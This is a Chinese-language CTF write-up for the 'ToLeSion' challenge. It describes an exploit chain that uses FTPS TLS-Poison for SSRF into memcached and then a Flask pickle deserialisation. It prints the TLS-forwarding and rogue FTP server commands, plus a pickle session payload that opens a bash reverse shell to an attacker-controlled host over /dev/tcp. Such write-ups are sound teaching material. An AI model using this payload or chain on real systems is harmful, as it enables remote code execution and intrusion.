# ToLeSion

这道题主要的考点是ftps的TLS-Poison + flask的pickle反序列化。

从源码可以看到，flask使用的是memcached存储session，而flask在读取memcached存储的session时会反序列化这里的内容，因此只需要向memcached写入一个恶意的session，触发反序列化即可。

那么如何向memcached写内容呢？

关于这一点，题目设置了很多的暗（ming）示：

* 标题的ToLeSion，大写字母TLS。
* memcached——经典TLS-Poison受害者。
* pycurl几乎禁用了所有的协议唯独没有禁用FTPS。
* 设置FTP_SKIP_PASV_IP为0。
  > ftp-skip-pasv-ip设置了curl不要使用被动模式下服务器提供的ip和端口，这个设置在curl 7.74.0版本之后默认是开启的，这里显式设置为0也是一个很强的暗示。

很明显，我们需要使用ftps打TLS-Poison，ssrf写memcached。

关于TLS-Poison，这里推荐一下zeddy师傅的博客，写得非常全面且详细：

* https://blog.zeddyu.info/2021/04/20/TLS-Poison/
* https://blog.zeddyu.info/2021/05/19/tls-ctf/

感谢zeddy师傅撰写了如此优秀的博客。

简单来说，当客户端使用ftps://ip:port/访问ftp服务器，ftp服务器在被动模式下向客户端指定数据传输的ip和端口，客户端连接服务器该ip和端口时会重用第一次连接的相关信息，这里就导致了ssrf。

针对TLS-Poison的利用，这里推荐一下这个github仓库：

https://github.com/jmdx/TLS-Poison。

我们可以用它来实现TLS层的解析，通过下面的命令监听8000端口并将tls解析之后应用层的内容转发给1234端口：

```shell
target/debug/custom-tls -p 8000 --verbose --certs /etc/letsencrypt/live/<your_domain>/fullchain.pem --key /etc/letsencrypt/live/<your_domain>/privkey.pem  forward 1234
```

使用redis设置payload：

```
set payload "\r\nset actfSession:whatever 0 0 <len>\n(S'/bin/bash -c \"/bin/bash -i >& /dev/tcp/<your_domain>/8080 0>&1\"'\nios\nsystem\n.\r\n"
```

经过8000端口的解析，转发到1234端口的内容就是普通的ftp请求了。在1234端口开启一个被动模式返回ip和端口是ssrf目标的ftp服务即可，针对本题就是127.0.0.1的11200端口：

```
python3 FTPserverForTLSpoison.py 1234 127.0.0.1 11200
```

控制目标机访问ftps://<your_domain>:8000/，即可触发上述TLS-Poison流程，向memcached写入序列化字符串。

最后监听8080端口，使用上述写入的session访问网站即可触发反序列化getshell。